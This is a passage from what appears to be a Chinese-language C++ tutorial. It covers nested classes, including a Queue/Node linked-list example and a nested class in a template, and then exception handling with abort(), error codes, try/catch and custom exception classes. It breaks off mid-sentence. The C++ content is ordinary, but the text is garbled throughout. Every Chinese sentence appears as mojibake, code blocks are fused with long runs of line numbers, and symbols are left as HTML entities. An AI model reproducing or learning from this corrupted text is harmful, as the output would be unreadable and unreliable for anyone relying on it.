åµŒå¥—ç±»å¯¹å¤–å›´ç±»çš„è®¿é—®: åµŒå¥—ç±»çš„æˆå‘˜å‡½æ•°å¯ä»¥è®¿é—®å¤–å›´ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ˆpublic, protected, privateï¼‰ï¼ŒåŒ…æ‹¬ç±»å‹åã€é™æ€æˆå‘˜ã€æšä¸¾å¸¸é‡ç­‰ã€‚ é‡è¦: åµŒå¥—ç±»è®¿é—®å¤–å›´ç±»çš„éé™æ€æˆå‘˜æ—¶ï¼Œå¿…é¡»é€šè¿‡å¤–å›´ç±»çš„å¯¹è±¡ã€æŒ‡é’ˆæˆ–å¼•ç”¨æ¥è¿›è¡Œã€‚åµŒå¥—ç±»å¯¹è±¡æœ¬èº«ä¸åŒ…å«ä¸€ä¸ªæŒ‡å‘å…¶å¤–å›´ç±»å¯¹è±¡çš„éšå¼æŒ‡é’ˆï¼ˆä¸åƒ Java çš„å†…éƒ¨ç±»ï¼‰ã€‚ å¤–å›´ç±»å¯¹åµŒå¥—ç±»çš„è®¿é—®: å¤–å›´ç±»çš„æˆå‘˜å‡½æ•°å¯ä»¥åˆ›å»ºåµŒå¥—ç±»çš„å¯¹è±¡ã€‚ å¤–å›´ç±»å¯¹å…¶åµŒå¥—ç±»çš„æˆå‘˜çš„è®¿é—®æƒé™ï¼Œéµå¾ªåµŒå¥—ç±»è‡ªèº«çš„è®¿é—®æ§åˆ¶è§„åˆ™ï¼ˆpublic, protected, privateï¼‰ã€‚ä»…ä»…å› ä¸ºä¸€ä¸ªç±»æ˜¯åµŒå¥—çš„ï¼Œå¹¶ä¸æ„å‘³ç€å¤–å›´ç±»å¯ä»¥æ— è§†å…¶è®¿é—®æ§åˆ¶ã€‚å¤–å›´ç±»ä¸èƒ½ç›´æ¥è®¿é—®åµŒå¥—ç±»çš„ private æˆå‘˜ï¼ˆé™¤éå¤–å›´ç±»æ˜¯åµŒå¥—ç±»çš„å‹å…ƒï¼‰ã€‚ ç¤ºä¾‹ï¼šé“¾å¼é˜Ÿåˆ—ä¸­çš„ Node åµŒå¥—ç±» å›é¡¾ç¬¬ 12 ç« çš„é˜Ÿåˆ—æ¨¡æ‹Ÿï¼ŒQueue ç±»å†…éƒ¨å®šä¹‰äº†ä¸€ä¸ª Node ç»“æ„ã€‚è¿™å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„åµŒå¥—ç±»ï¼ˆæˆ–ç»“æ„ï¼‰åº”ç”¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// queue.h (éƒ¨åˆ†)#ifndef QUEUE_H_#define QUEUE_H_class Customer; // å‰å‘å£°æ˜typedef Customer Item;class Queue &#123;private: // åµŒå¥—ç»“æ„ Node (ä½œç”¨åŸŸåœ¨ Queue å†…) // è®¾ä¸º privateï¼Œå› ä¸ºå®ƒæ˜¯ Queue çš„å®ç°ç»†èŠ‚ struct Node &#123; Item item; Node * next; &#125;; enum &#123; Q_SIZE = 10 &#125;; Node * front; // æŒ‡å‘ Node å¯¹è±¡çš„æŒ‡é’ˆ Node * rear; int items; const int qsize; // ... (ç¦æ­¢èµ‹å€¼) ...public: Queue(int qs = Q_SIZE); ~Queue(); bool isempty() const; bool isfull() const; int queuecount() const; bool enqueue(const Item &amp;item); // Queue çš„æ–¹æ³•å¯ä»¥åˆ›å»ºå’Œè®¿é—® Node å¯¹è±¡ bool dequeue(Item &amp;item);&#125;;#endif// queue.cpp (éƒ¨åˆ†)#include &quot;queue.h&quot;// ... Customer å®šä¹‰ ...Queue::Queue(int qs) : qsize(qs) &#123; front = rear = nullptr; items = 0;&#125;Queue::~Queue() &#123; Node * temp; // å¯ä»¥å£°æ˜ Node ç±»å‹çš„æŒ‡é’ˆ while (front != nullptr) &#123; temp = front; front = front-&gt;next; // å¯ä»¥è®¿é—® Node çš„æˆå‘˜ (å› ä¸º Node æ˜¯ Queue çš„åµŒå¥—ç±»ï¼Œä¸”æˆå‘˜é»˜è®¤ public) delete temp; &#125;&#125;bool Queue::enqueue(const Item &amp;item) &#123; if (isfull()) return false; Node * add = new Node; // å¯ä»¥åˆ›å»º Node å¯¹è±¡ add-&gt;item = item; // å¯ä»¥è®¿é—® Node çš„æˆå‘˜ add-&gt;next = nullptr; items++; if (front == nullptr) front = add; else rear-&gt;next = add; rear = add; return true;&#125;// ... dequeue å®ç°ç±»ä¼¼ ... åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼š Node çš„ä½œç”¨åŸŸä»…é™äº Queue ç±»ã€‚å¤–éƒ¨ä»£ç ä¸èƒ½ç›´æ¥ä½¿ç”¨ Node ç±»å‹ã€‚ Queue çš„æˆå‘˜å‡½æ•°ï¼ˆå¦‚æ„é€ å‡½æ•°ã€ææ„å‡½æ•°ã€enqueueï¼‰å¯ä»¥è‡ªç”±åœ°åˆ›å»º Node å¯¹è±¡ï¼Œå¹¶è®¿é—®å…¶æˆå‘˜ item å’Œ nextï¼ˆå› ä¸º struct æˆå‘˜é»˜è®¤æ˜¯ public çš„ï¼Œå¹¶ä¸” Node åœ¨ Queue çš„ä½œç”¨åŸŸå†…ï¼‰ã€‚ 15.2.2 æ¨¡æ¿ä¸­çš„åµŒå¥—åµŒå¥—ç±»ä¹Ÿå¯ä»¥åœ¨ç±»æ¨¡æ¿ä¸­å®šä¹‰ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041template &lt;typename T&gt;class OuterTemplate &#123;private: T outerData;public: // åµŒå¥—ç±» class Nested &#123; private: int nestedData; public: // åµŒå¥—ç±»çš„æˆå‘˜å‡½æ•°å¯ä»¥è®¿é—®å¤–å›´æ¨¡æ¿ç±»çš„æˆå‘˜ // (éœ€è¦é€šè¿‡å¤–å›´ç±»å¯¹è±¡) void processOuter(OuterTemplate&lt;T&gt;&amp; outer) &#123; std::cout &lt;&lt; &quot;Outer data: &quot; &lt;&lt; outer.outerData &lt;&lt; std::endl; // outer.outerData = someValue; // å¯ä»¥ä¿®æ”¹ &#125; &#125;;private: Nested nestedObj; // å¤–å›´ç±»å¯ä»¥åŒ…å«åµŒå¥—ç±»å¯¹è±¡public: OuterTemplate(const T&amp; data) : outerData(data) &#123;&#125; void useNested() &#123; nestedObj.processOuter(*this); &#125;&#125;;// ä½¿ç”¨int main() &#123; OuterTemplate&lt;double&gt; ot(3.14); ot.useNested(); // è¾“å‡º Outer data: 3.14 // å¼•ç”¨åµŒå¥—ç±»ç±»å‹éœ€è¦å¤–å›´ç±»æ¨¡æ¿å®ä¾‹åŒ– OuterTemplate&lt;double&gt;::Nested nestedInstance; // nestedInstance.processOuter(ot); // ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨ return 0;&#125; å½“å¤–å›´ç±»æ˜¯æ¨¡æ¿æ—¶ï¼ŒåµŒå¥—ç±»çš„å®šä¹‰é€šå¸¸ä¹Ÿä¾èµ–äºå¤–å›´ç±»çš„æ¨¡æ¿å‚æ•°ï¼ˆå¦‚ Nested å¯ä»¥è®¿é—® outerDataï¼Œå…¶ç±»å‹ä¸º Tï¼‰ã€‚ åœ¨å¤–éƒ¨å¼•ç”¨åµŒå¥—ç±»ç±»å‹æ—¶ï¼Œéœ€è¦æŒ‡å®šå¤–å›´æ¨¡æ¿ç±»çš„å…·ä½“å®ä¾‹åŒ–ç±»å‹ï¼Œä¾‹å¦‚ OuterTemplate&lt;double&gt;::Nestedã€‚ æ€»ç»“: åµŒå¥—ç±»æ˜¯åœ¨å¦ä¸€ä¸ªç±»ï¼ˆå¤–å›´ç±»ï¼‰å†…éƒ¨å®šä¹‰çš„ç±»ã€‚ åµŒå¥—ç±»çš„ä½œç”¨åŸŸå±€é™äºå¤–å›´ç±»ã€‚ åµŒå¥—ç±»å¯ä»¥è®¿é—®å¤–å›´ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ˆé€šè¿‡å¯¹è±¡ã€æŒ‡é’ˆæˆ–å¼•ç”¨ï¼‰ã€‚ å¤–å›´ç±»è®¿é—®åµŒå¥—ç±»æˆå‘˜æ—¶ï¼Œå—åµŒå¥—ç±»è‡ªèº«è®¿é—®æ§åˆ¶çš„é™åˆ¶ã€‚ åµŒå¥—ç±»å¸¸ç”¨äºå®ç°ä¸å¤–å›´ç±»ç´§å¯†ç›¸å…³çš„è¾…åŠ©æ•°æ®ç»“æ„æˆ–åŠŸèƒ½ï¼Œæœ‰åŠ©äºå°è£…å®ç°ç»†èŠ‚ã€‚ åµŒå¥—ç±»å¯ä»¥å‡ºç°åœ¨æ™®é€šç±»å’Œç±»æ¨¡æ¿ä¸­ã€‚ 15.3 å¼‚å¸¸ç¨‹åºåœ¨è¿è¡Œæ—¶å¯èƒ½ä¼šé‡åˆ°å„ç§é”™è¯¯æˆ–æ„å¤–æƒ…å†µï¼Œä¾‹å¦‚ï¼š ç”¨æˆ·è¾“å…¥æ— æ•ˆæ•°æ®ã€‚ è¯•å›¾æ‰“å¼€ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ã€‚ å†…å­˜åˆ†é…å¤±è´¥ (new å¤±è´¥)ã€‚ è¿ç®—é”™è¯¯ï¼ˆå¦‚é™¤ä»¥é›¶ï¼‰ã€‚ å¤„ç†è¿™äº›é—®é¢˜å¯¹äºç¼–å†™å¥å£®çš„ç¨‹åºè‡³å…³é‡è¦ã€‚C++ æä¾›äº†å¼‚å¸¸å¤„ç† (Exception Handling) æœºåˆ¶ï¼Œä½œä¸ºä¸€ç§å¼ºå¤§è€Œçµæ´»çš„é”™è¯¯å¤„ç†æ–¹å¼ã€‚ åœ¨ä»‹ç»å¼‚å¸¸æœºåˆ¶ä¹‹å‰ï¼Œå…ˆçœ‹çœ‹ä¸€äº›ä¼ ç»Ÿçš„é”™è¯¯å¤„ç†æ–¹æ³•åŠå…¶å±€é™æ€§ã€‚ 15.3.1 è°ƒç”¨ abort()æœ€ç®€å•ç²—æš´çš„æ–¹å¼æ˜¯ï¼Œå½“ç¨‹åºæ£€æµ‹åˆ°æ— æ³•å¤„ç†çš„é”™è¯¯æ—¶ï¼Œè°ƒç”¨ abort() å‡½æ•°ï¼ˆå®šä¹‰åœ¨ &lt;cstdlib&gt; æˆ– &lt;stdlib.h&gt; ä¸­ï¼‰ã€‚abort() ä¼šå‘æ“ä½œç³»ç»Ÿå‘é€ä¸€ä¸ªå¼‚å¸¸ç»ˆæ­¢ä¿¡å·ï¼ˆå¦‚ abnormal program terminationï¼‰ï¼Œç«‹å³åœæ­¢ç¨‹åºçš„æ‰§è¡Œã€‚ 1234567891011121314151617#include &lt;iostream&gt;#include &lt;cstdlib&gt; // for abort()double hmean(double a, double b) &#123; if (a == -b) &#123; std::cerr &lt;&lt; &quot;Error: hmean() arguments a = -b not allowed.\\n&quot;; std::abort(); // ç»ˆæ­¢ç¨‹åº &#125; return 2.0 * a * b / (a + b);&#125;int main() &#123; double result = hmean(10.0, -10.0); // è¿™è¡Œä¸ä¼šæ‰§è¡Œ std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; ç¼ºç‚¹: ç¨‹åºçªç„¶ç»ˆæ­¢ï¼Œç”¨æˆ·å¯èƒ½ä¸çŸ¥é“åŸå› ã€‚ æ²¡æœ‰æœºä¼šè¿›è¡Œæ¸…ç†å·¥ä½œï¼ˆå¦‚ä¿å­˜æ•°æ®ã€å…³é—­æ–‡ä»¶ã€é‡Šæ”¾èµ„æºï¼‰ã€‚ 15.3.2 è¿”å›é”™è¯¯ç ä¸€ç§æ›´å¸¸è§çš„åšæ³•æ˜¯è®©å‡½æ•°åœ¨å‡ºé”™æ—¶è¿”å›ä¸€ä¸ªç‰¹æ®Šçš„é”™è¯¯ç ï¼ˆä¾‹å¦‚ 0, -1, false æˆ– nullptrï¼‰ï¼Œè°ƒç”¨è€…è´Ÿè´£æ£€æŸ¥è¿™ä¸ªè¿”å›å€¼å¹¶é‡‡å–ç›¸åº”æªæ–½ã€‚ 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;cerrno&gt; // for errno (C-style error reporting)// è¿”å› -1 è¡¨ç¤ºé”™è¯¯int process_data(int input) &#123; if (input &lt; 0) &#123; errno = EDOM; // è®¾ç½®å…¨å±€é”™è¯¯ç  (Domain Error) return -1; // è¿”å›é”™è¯¯ç  &#125; // ... process data ... return 0; // è¿”å› 0 è¡¨ç¤ºæˆåŠŸ&#125;int main() &#123; if (process_data(-5) == -1) &#123; if (errno == EDOM) &#123; std::cerr &lt;&lt; &quot;Error: Invalid input detected.\\n&quot;; &#125; else &#123; std::cerr &lt;&lt; &quot;An unknown error occurred.\\n&quot;; &#125; // ... å¤„ç†é”™è¯¯ ... &#125; else &#123; std::cout &lt;&lt; &quot;Processing successful.\\n&quot;; &#125; return 0;&#125; ç¼ºç‚¹: è°ƒç”¨è€…å¿…é¡»æ£€æŸ¥: è°ƒç”¨è€…å¾ˆå®¹æ˜“å¿˜è®°æ£€æŸ¥é”™è¯¯ç ï¼Œå¯¼è‡´é”™è¯¯è¢«å¿½ç•¥ã€‚ é”™è¯¯ç æ··æ·†: å‡½æ•°çš„æ­£å¸¸è¿”å›å€¼å¯èƒ½ä¸é”™è¯¯ç å†²çªã€‚ é”™è¯¯ä¿¡æ¯æœ‰é™: å•ä¸ªé”™è¯¯ç å¯èƒ½ä¸è¶³ä»¥æè¿°é”™è¯¯çš„å…·ä½“åŸå› ã€‚ é”™è¯¯ä¼ é€’å¤æ‚: åœ¨æ·±å±‚åµŒå¥—çš„å‡½æ•°è°ƒç”¨ä¸­ï¼Œæ¯ä¸€å±‚éƒ½éœ€è¦æ£€æŸ¥å¹¶å‘ä¸Šä¼ é€’é”™è¯¯ç ï¼Œä½¿ä»£ç å†—é•¿ä¸”å®¹æ˜“å‡ºé”™ã€‚ 15.3.3 å¼‚å¸¸æœºåˆ¶C++ å¼‚å¸¸å¤„ç†æä¾›äº†ä¸€ç§æ›´ç»“æ„åŒ–ã€æ›´å¼ºå¤§çš„é”™è¯¯å¤„ç†æ–¹å¼ï¼Œå®ƒå°†é”™è¯¯æ£€æµ‹ï¼ˆåœ¨å‘ç”Ÿé”™è¯¯çš„åœ°æ–¹ï¼‰ä¸é”™è¯¯å¤„ç†ï¼ˆåœ¨èƒ½å¤Ÿå¤„ç†è¯¥é”™è¯¯çš„åœ°æ–¹ï¼‰åˆ†ç¦»å¼€æ¥ã€‚ å®ƒä¸»è¦æ¶‰åŠä¸‰ä¸ªå…³é”®å­—ï¼š throw: å½“å‡½æ•°æ£€æµ‹åˆ°æ— æ³•å¤„ç†çš„é”™è¯¯æ—¶ï¼Œä½¿ç”¨ throw å…³é”®å­—å¼•å‘ (throw) æˆ– æŠ›å‡º (raise) ä¸€ä¸ªå¼‚å¸¸ã€‚throw åé¢è·Ÿç€ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼çš„å€¼ï¼ˆç§°ä¸ºå¼‚å¸¸å¯¹è±¡ï¼‰çš„ç±»å‹å†³å®šäº†å¼‚å¸¸çš„ç±»å‹ã€‚ try: å°†å¯èƒ½å¼•å‘å¼‚å¸¸çš„ä»£ç å—ï¼ˆåŒ…æ‹¬å‡½æ•°è°ƒç”¨ï¼‰æ”¾åœ¨ try å—ä¸­ã€‚try å…³é”®å­—åé¢è·Ÿç€ä¸€ä¸ªèŠ±æ‹¬å· &#123;&#125; åŒ…å›´çš„ä»£ç å—ã€‚ catch: ç´§è·Ÿåœ¨ try å—ä¹‹åï¼Œä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ª catch å—æ¥æ•è· (catch) å’Œå¤„ç† (handle) å¼‚å¸¸ã€‚æ¯ä¸ª catch å—æŒ‡å®šå®ƒèƒ½å¤„ç†çš„å¼‚å¸¸ç±»å‹ã€‚ åŸºæœ¬æµç¨‹: ç¨‹åºæ‰§è¡Œè¿›å…¥ try å—ã€‚ å¦‚æœåœ¨ try å—ä¸­çš„ä»£ç ï¼ˆæˆ–å…¶è°ƒç”¨çš„ä»»ä½•å‡½æ•°ï¼‰æ‰§è¡Œäº† throw è¯­å¥ï¼Œä¸€ä¸ªå¼‚å¸¸è¢«å¼•å‘ã€‚ ç¨‹åºç«‹å³è·³å‡ºå½“å‰çš„ try å—ï¼ˆä»¥åŠä» try å—å¼€å§‹åˆ° throw ç‚¹ä¹‹é—´çš„æ‰€æœ‰å‡½æ•°è°ƒç”¨æ ˆï¼‰ï¼Œå¼€å§‹æŸ¥æ‰¾åŒ¹é…çš„ catch å—ã€‚ ç¨‹åºæŒ‰é¡ºåºæ£€æŸ¥ç´§è·Ÿåœ¨ try å—åé¢çš„ catch å—ã€‚ å¦‚æœæ‰¾åˆ°ä¸€ä¸ª catch å—ï¼Œå…¶å£°æ˜çš„å¼‚å¸¸ç±»å‹ä¸æŠ›å‡ºçš„å¼‚å¸¸å¯¹è±¡ç±»å‹åŒ¹é…ï¼ˆæˆ–è€…æ˜¯å…¶åŸºç±»ï¼Œæˆ–è€…æ˜¯ catch(...)ï¼‰ï¼Œåˆ™æ‰§è¡Œè¯¥ catch å—ä¸­çš„ä»£ç ã€‚ æ‰§è¡Œå®ŒåŒ¹é…çš„ catch å—åï¼Œç¨‹åºç»§ç»­æ‰§è¡Œè¯¥ catch å—ä¹‹åçš„ä»£ç ï¼ˆé™¤é catch å—æœ¬èº«åˆæŠ›å‡ºå¼‚å¸¸æˆ–ç»ˆæ­¢ç¨‹åºï¼‰ã€‚ å¦‚æœåœ¨å½“å‰ try...catch ç»“æ„ä¸­æ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„ catch å—ï¼Œå¼‚å¸¸ä¼šç»§ç»­å‘å¤–å±‚ä¼ æ’­ï¼ŒæŸ¥æ‰¾åŒ…å«å½“å‰ try å—çš„æ›´å¤–å±‚ try å—å¯¹åº”çš„ catch å—ã€‚ å¦‚æœå¼‚å¸¸ä¸€ç›´ä¼ æ’­åˆ° main å‡½æ•°ä¹‹å¤–ï¼ˆå³æ²¡æœ‰åœ¨ä»»ä½•åœ°æ–¹è¢«æ•è·ï¼‰ï¼Œç¨‹åºé€šå¸¸ä¼šè°ƒç”¨ std::terminate() å¼‚å¸¸ç»ˆæ­¢ã€‚ ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;stdexcept&gt; // åŒ…å«æ ‡å‡†å¼‚å¸¸ç±»ï¼Œå¦‚ std::runtime_errordouble hmean_exc(double a, double b) &#123; if (a == -b) &#123; // æŠ›å‡ºä¸€ä¸ª runtime_error ç±»å‹çš„å¼‚å¸¸å¯¹è±¡ throw std::runtime_error(&quot;hmean(): invalid arguments: a = -b&quot;); &#125; return 2.0 * a * b / (a + b);&#125;int main() &#123; double x, y, z; std::cout &lt;&lt; &quot;Enter two numbers: &quot;; while (std::cin &gt;&gt; x &gt;&gt; y) &#123; try &#123; // ---- try block starts ---- z = hmean_exc(x, y); std::cout &lt;&lt; &quot;Harmonic mean of &quot; &lt;&lt; x &lt;&lt; &quot; and &quot; &lt;&lt; y &lt;&lt; &quot; is &quot; &lt;&lt; z &lt;&lt; std::endl; &#125; // ---- try block ends ---- catch (const std::runtime_error &amp; e) &#123; // ---- catch block starts ---- // æ•è· runtime_error ç±»å‹çš„å¼‚å¸¸ (åŠå…¶æ´¾ç”Ÿç±») std::cerr &lt;&lt; &quot;Error caught: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; // what() è¿”å›é”™è¯¯ä¿¡æ¯å­—ç¬¦ä¸² std::cout &lt;&lt; &quot;Enter a new pair of numbers: &quot;; continue; // ç»§ç»­ä¸‹ä¸€æ¬¡å¾ªç¯è¾“å…¥ &#125; // ---- catch block ends ---- std::cout &lt;&lt; &quot;Enter next set of numbers &lt;q to quit&gt;: &quot;; &#125; std::cout &lt;&lt; &quot;Bye!\\n&quot;; return 0;&#125; ä¼˜ç‚¹: åˆ†ç¦»é”™è¯¯å¤„ç†: å°†é”™è¯¯å¤„ç†ä»£ç ä¸æ­£å¸¸é€»è¾‘åˆ†å¼€ï¼Œä½¿ä»£ç æ›´æ¸…æ™°ã€‚ å¼ºåˆ¶å¤„ç† (æŸç§ç¨‹åº¦ä¸Š): æœªæ•è·çš„å¼‚å¸¸é€šå¸¸ä¼šå¯¼è‡´ç¨‹åºç»ˆæ­¢ï¼Œè¿«ä½¿å¼€å‘è€…è€ƒè™‘é”™è¯¯å¤„ç†ã€‚ è‡ªåŠ¨ä¼ æ’­: å¼‚å¸¸ä¼šè‡ªåŠ¨æ²¿ç€è°ƒç”¨æ ˆå‘ä¸Šä¼ æ’­ï¼Œç›´åˆ°æ‰¾åˆ°åˆé€‚çš„å¤„ç†ç¨‹åºï¼Œæ— éœ€åœ¨æ¯å±‚å‡½æ•°æ‰‹åŠ¨ä¼ é€’é”™è¯¯ç ã€‚ ç±»å‹å®‰å…¨: å¯ä»¥æ ¹æ®å¼‚å¸¸å¯¹è±¡çš„ç±»å‹æ¥åŒºåˆ†ä¸åŒçš„é”™è¯¯ï¼Œå¹¶è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚ èµ„æºæ¸…ç†: ç»“åˆ RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰ï¼Œå¼‚å¸¸å¤„ç†å¯ä»¥ç¡®ä¿åœ¨å¼‚å¸¸å‘ç”Ÿæ—¶è‡ªåŠ¨é‡Šæ”¾èµ„æºï¼ˆé€šè¿‡æ ˆè§£é€€æ—¶è°ƒç”¨å±€éƒ¨å¯¹è±¡çš„ææ„å‡½æ•°ï¼‰ã€‚ 15.3.4 å°†å¯¹è±¡ç”¨ä½œå¼‚å¸¸ç±»å‹throw è¯­å¥å¯ä»¥æŠ›å‡ºä»»ä½•ç±»å‹çš„è¡¨è¾¾å¼ç»“æœï¼ŒåŒ…æ‹¬åŸºæœ¬ç±»å‹ï¼ˆå¦‚ int, const char*ï¼‰æˆ–ç±»ç±»å‹çš„å¯¹è±¡ã€‚ å¼ºçƒˆå»ºè®®ä½¿ç”¨ç±»ç±»å‹çš„å¯¹è±¡ä½œä¸ºå¼‚å¸¸ç±»å‹ï¼ŒåŸå› å¦‚ä¸‹ï¼š æºå¸¦æ›´å¤šä¿¡æ¯: å¯¹è±¡å¯ä»¥åŒ…å«å¤šä¸ªæ•°æ®æˆå‘˜ï¼Œæºå¸¦å…³äºé”™è¯¯çš„æ›´ä¸°å¯Œä¿¡æ¯ï¼ˆé”™è¯¯ç ã€é”™è¯¯æè¿°ã€å‘ç”Ÿä½ç½®ç­‰ï¼‰ã€‚ ç±»å‹å±‚æ¬¡: å¯ä»¥åˆ©ç”¨ç±»çš„ç»§æ‰¿å…³ç³»æ¥ç»„ç»‡å¼‚å¸¸ç±»å‹ã€‚catch å—å¯ä»¥æ•è·åŸºç±»ç±»å‹çš„å¼‚å¸¸ï¼Œä»è€Œå¤„ç†è¯¥åŸºç±»åŠå…¶æ‰€æœ‰æ´¾ç”Ÿç±»çš„å¼‚å¸¸ã€‚è¿™å…è®¸æˆ‘ä»¬ç¼–å†™æ›´é€šç”¨çš„é”™è¯¯å¤„ç†ä»£ç ã€‚ ç¤ºä¾‹ï¼šè‡ªå®šä¹‰å¼‚å¸¸ç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;cmath&gt; // for sqrt// è‡ªå®šä¹‰å¼‚å¸¸åŸºç±» (å¯ä»¥ç»§æ‰¿è‡ª std::exception)class MathError &#123;public: virtual void report() const &#123; std::cerr &lt;&lt; &quot;Math error\\n&quot;; &#125; virtual ~MathError() &#123;&#125; // è™šææ„å‡½æ•°å¾ˆé‡è¦&#125;;// æ´¾ç”Ÿå¼‚å¸¸ç±»ï¼šæ— æ•ˆå‚æ•°class BadArgument : public MathError &#123;private: double arg1; double arg2; // å¯èƒ½æœ‰å¤šä¸ªå‚æ•° std::string funcName;public: BadArgument(double a1, double a2, const std::string&amp; fname) : arg1(a1), arg2(a2), funcName(fname) &#123;&#125; virtual void report() const override &#123; std::cerr &lt;&lt; &quot;Bad arguments to function &quot; &lt;&lt; funcName &lt;&lt; &quot;(): &quot; &lt;&lt; arg1 &lt;&lt; &quot;, &quot; &lt;&lt; arg2 &lt;&lt; std::endl; &#125;&#125;;// æ´¾ç”Ÿå¼‚å¸¸ç±»ï¼šå®šä¹‰åŸŸé”™è¯¯class DomainError : public MathError &#123;private: double value; std::string funcName;public: DomainError(double val, const std::string&amp; fname) : value(val), funcName(fname) &#123;&#125; virtual void report() const override &#123; std::cerr &lt;&lt; &quot;Domain error in function &quot; &lt;&lt; funcName &lt;&lt; &quot;(): &quot; &lt;&lt; &quot;Invalid value &quot; &lt;&lt; value &lt;&lt; std::endl; &#125;&#125;;// å‡½æ•°å¯èƒ½æŠ›å‡ºå¼‚å¸¸double my_sqrt(double x) &#123; if (x &lt; 0.0) &#123; throw DomainError(x, &quot;my_sqrt&quot;); // æŠ›å‡º DomainError å¯¹è±¡ &#125; return std::sqrt(x);&#125;double hmean_exc2(double a, double b) &#123; if (a == -b) &#123; throw BadArgument(a, b, &quot;hmean_exc2&quot;); // æŠ›å‡º BadArgument å¯¹è±¡ &#125; return 2.0 * a * b / (a + b);&#125;int main() &#123; double a = 10.0, b = -10.0; double c = -5.0; try &#123; std::cout &lt;&lt; &quot;Calculating hmean...\\n&quot;; double result1 = hmean_exc2(a, b); std::cout &lt;&lt; &quot;Hmean result: &quot; &lt;&lt; result1 &lt;&lt; std::endl; // ä¸ä¼šæ‰§è¡Œ std::cout &lt;&lt; &quot;Calculating sqrt...\\n&quot;; double result2 = my_sqrt(c); std::cout &lt;&lt; &quot;Sqrt result: &quot; &lt;&lt; result2 &lt;&lt; std::endl; // ä¸ä¼šæ‰§è¡Œ &#125; // catch å—çš„é¡ºåºå¾ˆé‡è¦ï¼šæ´¾ç”Ÿç±»åº”åœ¨åŸºç±»ä¹‹å‰ catch (const BadArgument&amp; bae) &#123; std::cerr &lt;&lt; &quot;Caught BadArgument: &quot;; bae.report(); &#125; catch (const DomainError&amp; de) &#123; std::cerr &lt;&lt; &quot;Caught DomainError: &quot;; de.report(); &#125; catch (const MathError&amp; me) &#123; // æ•è·æ‰€æœ‰ MathError åŠå…¶æ´¾ç”Ÿç±» std::cerr &lt;&lt; &quot;Caught generic MathError: &quot;; me.report(); &#125; catch (...) &#123; // æ•è·ä»»ä½•å…¶ä»–ç±»å‹çš„å¼‚å¸¸ std::cerr &lt;&lt; &quot;Caught an unknown exception!\\n&quot;; &#125; std::cout &lt;&lt; &quot;Program continues after catch.\\n&quot;; return 0;&#125; æ•è·é¡ºåº: å½“ä½¿ç”¨ç»§æ‰¿å±‚æ¬¡ç»“æ„çš„å¼‚å¸¸ç±»æ—¶ï¼Œcatch å—çš„é¡ºåºéå¸¸é‡è¦ã€‚åº”è¯¥å°†æ´¾ç”Ÿç±»çš„ catch å—æ”¾åœ¨åŸºç±» catch å—ä¹‹å‰ã€‚å¦åˆ™ï¼ŒåŸºç±» catch å—ä¼šé¦–å…ˆæ•è·åˆ°æ´¾ç”Ÿç±»å¼‚å¸¸ï¼Œå¯¼è‡´æ´¾ç”Ÿç±»çš„ç‰¹å®šå¤„ç†é€»è¾‘æ— æ³•æ‰§è¡Œã€‚ æŒ‰å¼•ç”¨æ•è·: æ¨èä½¿ç”¨ const å¼•ç”¨ (const ExceptionType&amp; e) æ¥æ•è·å¼‚å¸¸ã€‚ é¿å…å¯¹è±¡**åˆ‡ç‰‡ (slicing)**ï¼šå¦‚æœæŒ‰å€¼æ•è·åŸºç±»å¼‚å¸¸ï¼Œå½“æŠ›å‡ºçš„æ˜¯æ´¾ç”Ÿç±»å¯¹è±¡æ—¶ï¼Œæ´¾ç”Ÿç±»ç‰¹æœ‰çš„éƒ¨åˆ†ä¼šä¸¢å¤±ã€‚ é¿å…å¤åˆ¶å¼€é”€ã€‚ ä½¿ç”¨ const å¼•ç”¨è¡¨æ˜å¤„ç†ç¨‹åºä¸æ‰“ç®—ä¿®æ”¹æ•è·åˆ°çš„å¼‚å¸¸å¯¹è±¡ã€‚ 15.3.5 å¼‚å¸¸è§„èŒƒå’Œ C++11 (throw(), noexcept)æ—©æœŸ C++ å…è®¸ä½¿ç”¨å¼‚å¸¸è§„èŒƒ (Exception Specifications) æ¥å£°æ˜å‡½æ•°å¯èƒ½æŠ›å‡ºå“ªäº›ç±»å‹çš„å¼‚å¸¸ã€‚ 123void func1() throw(BadArgument, DomainError); // å¯èƒ½æŠ›å‡º BadArgument æˆ– DomainErrorvoid func2() throw(); // ä¿è¯ä¸æŠ›å‡ºä»»ä½•å¼‚å¸¸void func3(); // å¯èƒ½æŠ›å‡ºä»»ä½•ç±»å‹çš„å¼‚å¸¸ (é»˜è®¤) é—®é¢˜: å¼‚å¸¸è§„èŒƒåœ¨å®è·µä¸­è¢«è¯æ˜æ•ˆæœä¸ä½³ä¸”éš¾ä»¥ç»´æŠ¤ã€‚ ç¼–è¯‘å™¨é€šå¸¸åªåœ¨è¿è¡Œæ—¶æ£€æŸ¥ï¼Œè€Œä¸æ˜¯ç¼–è¯‘æ—¶ã€‚ å¦‚æœå‡½æ•°æŠ›å‡ºäº†æœªåœ¨è§„èŒƒä¸­åˆ—å‡ºçš„å¼‚å¸¸ï¼Œç¨‹åºçš„è¡Œä¸ºæ˜¯è°ƒç”¨ std::unexpected()ï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒä¼šè°ƒç”¨ std::terminate()ã€‚ æ¨¡æ¿ä»£ç 